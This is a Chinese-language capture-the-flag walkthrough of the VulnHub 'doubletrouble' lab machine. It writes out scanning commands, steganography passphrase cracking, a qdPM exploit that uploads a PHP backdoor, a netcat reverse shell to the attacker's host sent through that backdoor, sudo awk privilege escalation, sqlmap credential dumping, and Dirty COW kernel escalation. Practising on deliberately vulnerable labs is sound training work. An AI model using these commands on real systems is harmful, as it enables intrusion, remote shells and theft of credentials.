靶机地址：[doubletrouble: 1 ~ VulnHub](https://vulnhub.com/entry/doubletrouble-1,743/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.43
sudo nmap -p22,80 -sV 192.168.1.43
# 22/tcp open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
# 80/tcp open   http    Apache httpd 2.4.38 ((Debian))
```
先访问web服务是一个登录页面，用的qdPM 9.1
通过信息收集，发现很多暴露的文件，但是没找到关键信息
```Shell
searchsploit qdPM > exp_qdPM.txt
cat exp_qdPM.txt
```
漏洞利用代码也至少需要一个账号和密码，搜索默认账号密码，也登录失败了
Web路径枚举
```Shell
sudo dirsearch -u http://192.168.1.43
```
在 `/secret` 路径下下载到一张图片：`doubletrouble.jpg` ，可能使用了隐写术
```Shell
steghide info doubletrouble.jpg
# 需要输入密码

stegseek doubletrouble.jpg /home/kali/Tools/Custom/rockyou.txt
# [i] Found passphrase: "92camaro"
# [i] Original filename: "creds.txt".
# [i] Extracting to "doubletrouble.jpg.out".
cat doubletrouble.jpg.out
# otisrush@localhost.com
# otis666
```
这样的话就获得了一个账号和密码
尝试执行漏洞利用代码
```Shell
cp /usr/share/exploitdb/exploits/php/webapps/50944.py .
python3 50944.py -url "http://192.168.1.43/" -u "otisrush@localhost.com" -p "otis666"
# Backdoor uploaded at - > http://192.168.1.43/uploads/users/184488-backdoor.php?cmd=whoami
```
反弹shell，访问
```
http://192.168.1.43/uploads/users/184488-backdoor.php?cmd=nc 192.168.1.26 4444 -e /bin/bash
http://192.168.1.43/uploads/users/184488-backdoor.php?cmd=nc%20192%2E168%2E1%2E26%204444%20%2De%20%2Fbin%2Fbash
```
成功获取到shell，尝试提权
```Shell
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/awk
```
去 [[02 Web工具#GTFOBins|GTFOBins]] 上查一下
```Shell
sudo awk 'BEGIN {system("/bin/sh")}'
# bash也行 更好用
sudo awk 'BEGIN {system("/bin/bash")}'
```
成功提权
```Shell
cd
ls
# doubletrouble.ova
```
又发现一个镜像文件，看来是要下载下来
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.44
sudo nmap -p22,80 -sV 192.168.1.44
# 22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.2.22 ((Debian))
```
访问一下web服务是一个登录页面
尝试一下SQL注入
```Shell
sqlmap -r request.txt -p "uname,psw"
```
存在SQL注入漏洞，尝试直接获取Shell
```Shell
sqlmap -r request.txt -p "uname" --os-shell
```
失败了，先看下数据
```Shell
sqlmap -r request.txt -p "uname" --dbms=mysql --dbs
```
用的是基于时间的盲注，比较慢，指定一下时间和线程
```Shell
sqlmap -r request.txt -p "uname" --dbms=mysql --time-sec=1 --threads=8 --dbs
# doubletrouble
sqlmap -r request.txt -p "uname" -D "doubletrouble" --dbms=mysql --time-sec=1 --threads=8 --tables
# users
sqlmap -r request.txt -p "uname" -D "doubletrouble" -T "users" --dbms=mysql --time-sec=1 --threads=8 --columns
# username password
sqlmap -r request.txt -p "uname" -D "doubletrouble" -T "users" -C "username,password" --dbms=mysql --time-sec=1 --threads=8 --dump
# montreux    GfsZxc1
# clapton     ZubZub99
```
登录没反应，试试SSH，`clapton` 这个账号成功连上了
尝试提权，几种方式都不行，还是利用内核提权
```Shell
uname -a
# Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
which gcc
# /usr/bin/gcc
```
利用脏牛漏洞：[[20 CVE#CVE-2016–5195|CVE-2016–5195]] 成功提权


